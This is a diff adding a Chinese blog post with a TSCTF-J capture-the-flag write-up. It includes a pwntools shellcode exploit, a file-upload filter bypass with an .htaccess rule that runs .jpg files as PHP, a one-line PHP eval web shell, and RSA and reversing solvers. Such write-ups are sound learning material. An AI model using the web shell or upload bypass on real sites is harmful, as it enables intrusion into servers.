+</li>
+<li><p>标准输出被关闭</p>
+<p>悄悄在沙箱函数最后一行关闭了标准输出，所以在调试的时候syscall的调用如下所示，若标准输出没有关闭，fd应该会指向&#x2F;dev&#x2F;pts&#x2F;n才对。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f6e069aa09f    syscall  &lt;SYS_writev&gt;</span><br><span class="line">    fd: 0x1                 //应该要/dev/pts/n才对</span><br><span class="line">    iovec: 0x7f6e069ab040 —▸ 0x7f6e069ab000 ◂— <span class="string">&#x27;TSCTF_J&#123;1111111111&#125;\n&#x27;</span></span><br><span class="line">    count: 0x1</span><br></pre></td></tr></table></figure>
+
+<p>这里用标准错误输出即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f588ca8c09f    syscall  &lt;SYS_writev&gt;</span><br><span class="line">    fd: 0x2 (/dev/pts/1)</span><br><span class="line">    iovec: 0x7f588ca8d040 —▸ 0x7f588ca8d000 ◂— <span class="string">&#x27;TSCTF_J&#123;1111111111&#125;\n&#x27;</span></span><br><span class="line">    count: 0x1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>exp</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    giacomo = process(<span class="string">&#x27;./sc1&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    giacomo = remote(<span class="string">&quot;64.27.6.187&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># gdb.attach(giacomo)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    get_addr = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    lea rbx, [rip]</span></span><br><span class="line"><span class="string">    mov rsp, rbx</span></span><br><span class="line"><span class="string">    add rsp, 0x100</span></span><br><span class="line"><span class="string">    sub rbx, 0x34    </span></span><br><span class="line"><span class="string">    mov r14, 0x7b4a2d4654435354</span></span><br><span class="line"><span class="string">nomatch:  </span></span><br><span class="line"><span class="string">    add rbx, 0x1000</span></span><br><span class="line"><span class="string">    mov rcx, [rbx]</span></span><br><span class="line"><span class="string">    cmp rcx, r14</span></span><br><span class="line"><span class="string">    je match;</span></span><br><span class="line"><span class="string">    jne nomatch;</span></span><br><span class="line"><span class="string">match:</span></span><br><span class="line"><span class="string">    mov rcx, rbx</span></span><br><span class="line"><span class="string">    mov r10, rbx</span></span><br><span class="line"><span class="string">    add r10, 0x40</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    move_data=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbp, r10</span></span><br><span class="line"><span class="string">    sub rbp, 0x8</span></span><br><span class="line"><span class="string">    mov 0x8[rbp], rbx</span></span><br><span class="line"><span class="string">    add rbp, 0x8</span></span><br><span class="line"><span class="string">    mov r12, 0x1f</span></span><br><span class="line"><span class="string">    mov 0x8[rbp], r12</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    get_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x14</span></span><br><span class="line"><span class="string">    mov rsi, r10</span></span><br><span class="line"><span class="string">    mov rdi, 0x2</span></span><br><span class="line"><span class="string">    mov rdx, 0x1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload = asm(get_addr)</span><br><span class="line">    payload += asm(move_data)</span><br><span class="line">    payload += asm(get_flag)</span><br><span class="line">    giacomo.send(payload)</span><br><span class="line">    flag=giacomo.recv()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="词超人"><a href="#词超人" class="headerlink" title="词超人"></a>词超人</h3><ul>
+<li><p>用en标签里的英文答案作为answerarray上传</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uncover</span>(<span class="params">button</span>)&#123;</span><br><span class="line">    button.<span class="property">parentNode</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;en&#x27;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">visibility</span>=</span><br><span class="line">        button.<span class="property">parentNode</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;en&#x27;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">visibility</span>==<span class="string">&quot;hidden&quot;</span>?</span><br><span class="line">        <span class="string">&quot;visible&quot;</span>:</span><br><span class="line">    <span class="string">&quot;hidden&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">submit</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> answerArray=[];</span><br><span class="line">    <span class="keyword">let</span> divArray=<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;chunk&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span>(div <span class="keyword">of</span> divArray)&#123;</span><br><span class="line">        <span class="comment">//在这里修改</span></span><br><span class="line">        answerArray.<span class="title function_">push</span>(&#123;<span class="attr">id</span>:div.<span class="property">id</span>,<span class="attr">answer</span>:div.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;en&#x27;</span>)[<span class="number">0</span>].<span class="property">innerHTML</span>&#125;)  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">&quot;/submit&quot;</span>;</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">    xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(xhr.<span class="property">responseText</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(answerArray));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（关于我不知道在控制台改js，在元素那里想了很久这件事）</p>
+</li>
+</ul>
+<h3 id="onlyimg"><a href="#onlyimg" class="headerlink" title="onlyimg"></a>onlyimg</h3><ul>
+<li><p>文件上传地址</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$msg</span>=<span class="string">&quot;Upload Success ! Your file name is : %s&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$fileinfo</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$msg</span>, <span class="variable">$value</span>);      <span class="comment">//用fileinfo的值替换msg里的%s</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;But I don&#x27;t know where it stores......&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>将上传的文件命名成%s就可以得到地址了</p>
+</li>
+<li><p>后缀名绕过</p>
+<p>把php命名为jpg</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://39.107.138.71:8080/upload.php&#x27;</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;%s.jpg&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;a.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))&#125; </span><br><span class="line">response = requests.post(url, files=files)</span><br><span class="line">text = response.text</span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure>
+
+<p>上传.htaccess文件修改配置信息，把.jpg解析成php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;.jpg&quot;</span>&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>php标签绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="真真"><a href="#真真" class="headerlink" title="真真"></a>真真</h3><ul>
+<li>JSFUCK</li>
+</ul>
+<h3 id="错过了学姐奶茶的寒秋送温暖"><a href="#错过了学姐奶茶的寒秋送温暖" class="headerlink" title="错过了学姐奶茶的寒秋送温暖"></a>错过了学姐奶茶的寒秋送温暖</h3><ul>
+<li><p>脚本改文件类型</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://120.53.241.93:10086/&#x27;</span></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.php&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;a.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;image/jpg&#x27;</span>)</span><br><span class="line">response = requests.post(url, files=files)</span><br><span class="line">text = response.text</span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure>
+
+<p>（关于我差点忘记可以写python发请求这件事）</p>
+</li>
+</ul>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><ul>
+<li><p>flag1<br>  知道p、q的解密过程如下</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n = p *q</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>flag2</p>
+<p>p、q的值较小，直接分解<a target="_blank" rel="noopener" href="http://www.factordb.com/index.php">大数分解</a></p>
+</li>
+<li><p>flag3</p>
+<p>p、q值相近，用yafu来找相近的素数</p>
+</li>
+<li><p>flag4</p>
+<p>乘方的次数太小不够取模，直接开方</p>
+</li>
+<li><p>exp</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">    <span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">    </span><br><span class="line">    p = <span class="number">126848068662434725837362927110508359670513097902158347608742478683379412542373205396355795471254038301102414856525121647188484976552142343067044591036870463204973197337043645689668460536955381260032883948287738855267140030987485450026217231376934834164731323791161242646800219869703713605170682364116602398481</span></span><br><span class="line">    q = <span class="number">108831434115512090318037589335170063989256445400295000303568098461799570376658935415095544400164386313684432766346946165811277996284801631673216470358009654117077854125122927553974223129029217160157869796055967783796164293604324171269850795257143703187899358858675646672321319018167474020363026585548820771697</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c = <span class="number">12806426835071949867711416962709958594314368469792264574105984900555439512183487926101898057954900183669492820478219013019317212504718045553210233002824678962092820191899047884098185828625477721152790480535997733511787559909800255732856472382084502459064555276405636335011653299264667296955585832665754137638936306114164795630686750776282273654483469063781121080308493239356585954141139584326117462247270605137016151223704623131634401478066683053816761883398796060573577823014077050991745590269109018594293646949390055766822956018083267147781811450534232319486801350308073725708881185484667042111239958769639753074974</span></span><br><span class="line">    d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    n = p *q</span><br><span class="line">    m=powmod(c,d,n)</span><br><span class="line">    m = long_to_bytes(m).decode()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    </span><br><span class="line">    n = <span class="number">117468512089531428663961257960238163911</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c = <span class="number">116661533228458434140621528983098975679</span></span><br><span class="line">    p = <span class="number">10044079891992334031</span></span><br><span class="line">    q = <span class="number">11695298459661145481</span></span><br><span class="line">    d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    n = p *q</span><br><span class="line">    m=powmod(c,d,n)</span><br><span class="line">    m = long_to_bytes(m).decode()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    </span><br><span class="line">    q = <span class="number">116157631074161326668152038927249334338399827206586914589176832177082944299227717473355044107614652079152523161147120835537353552449908708629934368874677505050900078018992526314964561246045453416854196152086105218778204572329269076361235953745958869643828443636138454981800813514293034142691705140488032060333</span></span><br><span class="line">    p = <span class="number">116157631074161326668152038927249334338399827206586914589176832177082944299227717473355044107614652079152523161147120835537353552449908708629934368874677505050900078018992526314964561246045453416854196152086105218778204572329269076361235953745958869643828443636138454981800813514293034142691705140488032064827</span></span><br><span class="line">    n = <span class="number">13492595256760969040679230352398486845474955975199604800660741616776625780411272813224167801996221854423950963429539941573997611430663873182935561614207154821126761724862959388136641380305863820357311556705058402764857971168891247598952474612658335721334501562320453135569072859647106595744699686106575394155623607871280406174889010332061295980615904318604783210190774745857252314015710989087615728493401949363616443440371076313467788459099129219583070179936217564350523405302532093137784337453902235992607281224617514376983703401850900613434289916680690958012167734859041293116971287070809385300950616506089031207391</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c = <span class="number">9556855627975459046740821834528544070427049621127160951742003478725424449033433009828717934730280978533743220944726870403563278379897696996593408941742726761954126312142544881536075456011232335038713394388844246035946642298588354835538957640121051986433171003548328013363624428388045689223434747553158248457199579326477645217581943607544640937724609291757178063476167129106555047385785925998650584941948353305651394629383203202173799027705269424908549510903196317581322985993424298619576745664607011471390391051884932663025002185768778902167735501719300645089512150938345539777564021221129832163135987500087303945958</span></span><br><span class="line">    </span><br><span class="line">    d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    n = p *q</span><br><span class="line">    m=powmod(c,d,n)</span><br><span class="line">    m = long_to_bytes(m).decode()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    </span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    c = <span class="number">24352183908812439486066187971806232095447207924326195067955513727448051350160252184726311366048048945796542616778567176778473328388848916602914602254361942853429047133399539108358587787495587158203125</span></span><br><span class="line">    n = <span class="number">16311936352179992492322678030084754707912920265012738488001035655568811201293057367042418918656434158566661057011011903060966139141261511970173395803273617809596669492853191556134593000727887389753473207671720940942296594391783348274481657029091989837730022520412600669905401644620228349730622930180575214015304207221073824165287677553936892684490958627884970712382480336987266790423306814756649897559941928884283783109014172545384266583536851269964790353704338665524956130951949158484613551769004309270737394403919413951880647112332734742309798941724190059029780419002154606451025683494409014840175366489059673990383</span></span><br><span class="line">    </span><br><span class="line">    m = gmpy2.iroot(c, e)</span><br><span class="line">    m = <span class="number">30464294894851269162823603325</span></span><br><span class="line">    m = long_to_bytes(m).decode()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment">### nonograms</span></span><br><span class="line"></span><br><span class="line">​		先写出开、得，结合hint，猜到是旗开得胜。</span><br><span class="line"></span><br><span class="line"><span class="comment">## ab</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### abstract_culture_revenge</span></span><br><span class="line"></span><br><span class="line">​	  比较确定的是最后一个蘑菇应该是“君”（菌）。水晶球应该是“不”（卜），这两个是在古诗语境下比较常见的解释。于是猜测后三字应该是“不见君”，“不识君”。结合前文，得出flag。（虽然猜的很不容易，但总的来说这题好妙！）</span><br><span class="line"></span><br><span class="line"><span class="comment">### helang</span></span><br><span class="line"></span><br><span class="line">- speak to saint he</span><br><span class="line"></span><br><span class="line">  ```bash</span><br><span class="line">  Speak to Saint He &gt; u8 b = <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span></span><br><span class="line">  Speak to Saint He &gt; u8 egg = <span class="number">688333</span> * b[<span class="number">1</span>]</span><br><span class="line">  Speak to Saint He &gt; <span class="built_in">print</span> egg</span><br><span class="line">  <span class="number">688333</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="byr之声"><a href="#byr之声" class="headerlink" title="byr之声"></a>byr之声</h3><p>​	倒放</p>
+<p>​		</p>
+<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="byte-code"><a href="#byte-code" class="headerlink" title="byte_code"></a>byte_code</h3><ul>
+<li><p>字节码简介</p>
+<p>汇编之于c语言，字节码之于python</p>
+</li>
+<li><p>硬逆字节码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">114</span>,<span class="number">101</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">98</span>,<span class="number">121</span>,<span class="number">116</span>,<span class="number">101</span>]</span><br><span class="line">b = [<span class="number">99</span>, <span class="number">111</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>]</span><br><span class="line">e = [<span class="number">80</span>, <span class="number">115</span>, <span class="number">193</span>, <span class="number">24</span>, <span class="number">226</span>, <span class="number">237</span>, <span class="number">202</span>, <span class="number">212</span>, <span class="number">126</span>, <span class="number">46</span>, <span class="number">205</span>, <span class="number">208</span>, <span class="number">215</span>, <span class="number">135</span>, <span class="number">228</span>, <span class="number">199</span>, <span class="number">63</span>, <span class="number">159</span>, <span class="number">117</span>, <span class="number">52</span>, <span class="number">254</span>, <span class="number">247</span>, <span class="number">0</span>, <span class="number">133</span>, <span class="number">163</span>, <span class="number">248</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">248</span>, <span class="number">236</span>, <span class="number">68</span>]</span><br><span class="line">pos = [<span class="number">9</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">13</span>]</span><br><span class="line">d = [<span class="number">335833164</span>, <span class="number">1155265242</span>, <span class="number">627920619</span>, <span class="number">1951749419</span>, <span class="number">1931742276</span>, <span class="number">856821608</span>, <span class="number">489891514</span>, <span class="number">366025591</span>, <span class="number">1256805508</span>, <span class="number">1106091325</span>, <span class="number">128288025</span>, <span class="number">234430359</span>, <span class="number">314915121</span>, <span class="number">249627427</span>, <span class="number">207058976</span>, <span class="number">1573143998</span>, <span class="number">1443233295</span>, <span class="number">245654538</span>, <span class="number">1628003955</span>, <span class="number">220633541</span>, <span class="number">1412601456</span>, <span class="number">1029130440</span>, <span class="number">1556565611</span>, <span class="number">1644777223</span>, <span class="number">853364248</span>, <span class="number">58316711</span>, <span class="number">734735924</span>, <span class="number">1745226113</span>, <span class="number">1441619500</span>, <span class="number">1426836945</span>, <span class="number">500084794</span>, <span class="number">1534413607</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__ == <span class="string">&#x27;__main__&#x27;</span>):</span><br><span class="line">	c = a+b          </span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">chr</span>(c[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">chr</span>(c[<span class="number">31</span>]))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">		a[i]=(a[i]+d[i])^b[pos[i]]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">		b[i]=b[i]^a[pos[i]] </span><br><span class="line">	c = a+b</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">		c[i] = (c[i]*d[i])%<span class="number">256</span></span><br><span class="line">		c[i]^=e[i]</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">chr</span>(c[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://91ac0m0.github.io/2022/10/13/tsctf-j/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
